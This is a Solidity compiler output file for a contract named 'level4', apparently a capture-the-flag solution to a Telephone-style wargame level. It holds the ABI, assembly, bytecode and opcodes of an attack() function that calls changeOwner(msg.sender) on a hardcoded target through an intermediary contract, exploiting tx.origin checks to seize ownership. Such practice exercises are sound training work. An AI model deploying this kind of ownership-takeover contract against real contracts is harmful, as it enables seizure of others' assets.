{
	"contracts/level4.sol": {
		"level4": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "surface",
					"outputs": [
						{
							"internalType": "contract ITelephone",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/level4.sol\":106:388  contract level4 {\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/level4.sol\":165:262  constructor() {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contracts/level4.sol\":211:253  0x8AC9ca0984412656046305de3B163CFcd662F2FB */\n  0x8ac9ca0984412656046305de3b163cfcd662f2fb\n    /* \"contracts/level4.sol\":190:197  surface */\n  0x00\n  dup1\n    /* \"contracts/level4.sol\":190:254  surface = ITelephone(0x8AC9ca0984412656046305de3B163CFcd662F2FB) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/level4.sol\":106:388  contract level4 {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/level4.sol\":106:388  contract level4 {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0e94ba83\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/level4.sol\":131:156  ITelephone public surface */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/level4.sol\":270:385  function attack() external {\r... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/level4.sol\":131:156  ITelephone public surface */\n    tag_6:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/level4.sol\":270:385  function attack() external {\r... */\n    tag_10:\n        /* \"contracts/level4.sol\":308:324  address _address */\n      0x00\n        /* \"contracts/level4.sol\":327:337  msg.sender */\n      caller\n        /* \"contracts/level4.sol\":308:337  address _address = msg.sender */\n      swap1\n      pop\n        /* \"contracts/level4.sol\":348:355  surface */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/level4.sol\":348:367  surface.changeOwner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa6f9dae1\n        /* \"contracts/level4.sol\":368:376  _address */\n      dup3\n        /* \"contracts/level4.sol\":348:377  surface.changeOwner(_address) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/level4.sol\":297:385  {\r... */\n      pop\n        /* \"contracts/level4.sol\":270:385  function attack() external {\r... */\n      jump\t// out\n        /* \"#utility.yul\":7:125   */\n    tag_18:\n        /* \"#utility.yul\":94:118   */\n      tag_20\n        /* \"#utility.yul\":112:117   */\n      dup2\n        /* \"#utility.yul\":94:118   */\n      tag_21\n      jump\t// in\n    tag_20:\n        /* \"#utility.yul\":89:92   */\n      dup3\n        /* \"#utility.yul\":82:119   */\n      mstore\n        /* \"#utility.yul\":7:125   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":131:294   */\n    tag_22:\n        /* \"#utility.yul\":234:287   */\n      tag_24\n        /* \"#utility.yul\":281:286   */\n      dup2\n        /* \"#utility.yul\":234:287   */\n      tag_25\n      jump\t// in\n    tag_24:\n        /* \"#utility.yul\":229:232   */\n      dup3\n        /* \"#utility.yul\":222:288   */\n      mstore\n        /* \"#utility.yul\":131:294   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":300:522   */\n    tag_13:\n        /* \"#utility.yul\":393:397   */\n      0x00\n        /* \"#utility.yul\":431:433   */\n      0x20\n        /* \"#utility.yul\":420:429   */\n      dup3\n        /* \"#utility.yul\":416:434   */\n      add\n        /* \"#utility.yul\":408:434   */\n      swap1\n      pop\n        /* \"#utility.yul\":444:515   */\n      tag_27\n        /* \"#utility.yul\":512:513   */\n      0x00\n        /* \"#utility.yul\":501:510   */\n      dup4\n        /* \"#utility.yul\":497:514   */\n      add\n        /* \"#utility.yul\":488:494   */\n      dup5\n        /* \"#utility.yul\":444:515   */\n      tag_18\n      jump\t// in\n    tag_27:\n        /* \"#utility.yul\":300:522   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":528:782   */\n    tag_8:\n        /* \"#utility.yul\":637:641   */\n      0x00\n        /* \"#utility.yul\":675:677   */\n      0x20\n        /* \"#utility.yul\":664:673   */\n      dup3\n        /* \"#utility.yul\":660:678   */\n      add\n        /* \"#utility.yul\":652:678   */\n      swap1\n      pop\n        /* \"#utility.yul\":688:775   */\n      tag_29\n        /* \"#utility.yul\":772:773   */\n      0x00\n        /* \"#utility.yul\":761:770   */\n      dup4\n        /* \"#utility.yul\":757:774   */\n      add\n        /* \"#utility.yul\":748:754   */\n      dup5\n        /* \"#utility.yul\":688:775   */\n      tag_22\n      jump\t// in\n    tag_29:\n        /* \"#utility.yul\":528:782   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":788:884   */\n    tag_21:\n        /* \"#utility.yul\":825:832   */\n      0x00\n        /* \"#utility.yul\":854:878   */\n      tag_31\n        /* \"#utility.yul\":872:877   */\n      dup3\n        /* \"#utility.yul\":854:878   */\n      tag_32\n      jump\t// in\n    tag_31:\n        /* \"#utility.yul\":843:878   */\n      swap1\n      pop\n        /* \"#utility.yul\":788:884   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":890:1016   */\n    tag_32:\n        /* \"#utility.yul\":927:934   */\n      0x00\n        /* \"#utility.yul\":967:1009   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":960:965   */\n      dup3\n        /* \"#utility.yul\":956:1010   */\n      and\n        /* \"#utility.yul\":945:1010   */\n      swap1\n      pop\n        /* \"#utility.yul\":890:1016   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1022:1164   */\n    tag_25:\n        /* \"#utility.yul\":1088:1097   */\n      0x00\n        /* \"#utility.yul\":1121:1158   */\n      tag_35\n        /* \"#utility.yul\":1152:1157   */\n      dup3\n        /* \"#utility.yul\":1121:1158   */\n      tag_36\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":1108:1158   */\n      swap1\n      pop\n        /* \"#utility.yul\":1022:1164   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1170:1296   */\n    tag_36:\n        /* \"#utility.yul\":1220:1229   */\n      0x00\n        /* \"#utility.yul\":1253:1290   */\n      tag_38\n        /* \"#utility.yul\":1284:1289   */\n      dup3\n        /* \"#utility.yul\":1253:1290   */\n      tag_39\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":1240:1290   */\n      swap1\n      pop\n        /* \"#utility.yul\":1170:1296   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1302:1415   */\n    tag_39:\n        /* \"#utility.yul\":1352:1361   */\n      0x00\n        /* \"#utility.yul\":1385:1409   */\n      tag_41\n        /* \"#utility.yul\":1403:1408   */\n      dup3\n        /* \"#utility.yul\":1385:1409   */\n      tag_32\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":1372:1409   */\n      swap1\n      pop\n        /* \"#utility.yul\":1302:1415   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220dc84024fc019c23e0abf2bec4d37a3ea6663088b31ee1f36238f0b2142e2cf7864736f6c63430008070033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b50738ac9ca0984412656046305de3b163cfcd662f2fb6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061020c806100746000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80630e94ba831461003b5780639e5faafc14610059575b600080fd5b610043610063565b6040516100509190610153565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600033905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1826040518263ffffffff1660e01b81526004016100e59190610138565b600060405180830381600087803b1580156100ff57600080fd5b505af1158015610113573d6000803e3d6000fd5b5050505050565b6101238161016e565b82525050565b610132816101a0565b82525050565b600060208201905061014d600083018461011a565b92915050565b60006020820190506101686000830184610129565b92915050565b600061017982610180565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101ab826101b2565b9050919050565b60006101bd826101c4565b9050919050565b60006101cf82610180565b905091905056fea2646970667358221220dc84024fc019c23e0abf2bec4d37a3ea6663088b31ee1f36238f0b2142e2cf7864736f6c63430008070033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH20 0x8AC9CA0984412656046305DE3B163CFCD662F2FB PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x20C DUP1 PUSH2 0x74 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xE94BA83 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x153 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xE5 SWAP2 SWAP1 PUSH2 0x138 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x113 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH2 0x123 DUP2 PUSH2 0x16E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x132 DUP2 PUSH2 0x1A0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x14D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x11A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x168 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x129 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x179 DUP3 PUSH2 0x180 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AB DUP3 PUSH2 0x1B2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1BD DUP3 PUSH2 0x1C4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1CF DUP3 PUSH2 0x180 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDC DUP5 MUL 0x4F 0xC0 NOT 0xC2 RETURNDATACOPY EXP 0xBF 0x2B 0xEC 0x4D CALLDATACOPY LOG3 0xEA PUSH7 0x63088B31EE1F36 0x23 DUP16 SIGNEXTEND 0x21 TIMESTAMP 0xE2 0xCF PUSH25 0x64736F6C634300080700330000000000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "104800",
						"executionCost": "24420",
						"totalCost": "129220"
					},
					"external": {
						"attack()": "infinite",
						"surface()": "2575"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"surface()": "0e94ba83"
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}